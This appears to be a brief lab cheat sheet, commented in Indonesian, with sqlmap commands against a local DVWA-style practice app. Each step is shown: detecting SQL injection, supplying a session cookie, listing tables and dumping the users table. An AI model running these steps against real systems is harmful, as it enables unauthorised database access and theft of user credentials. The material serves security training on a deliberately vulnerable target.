# Menemukan vulnerabilities SQL Injection
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --batch
# Menambahkan cookie untuk autentikasi
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" --batch
# Mengeksploitasi SQL Injection dengan enumeration
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" --tables --batch
# Melihat data table users (dump data)
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" --dump -T users --batch
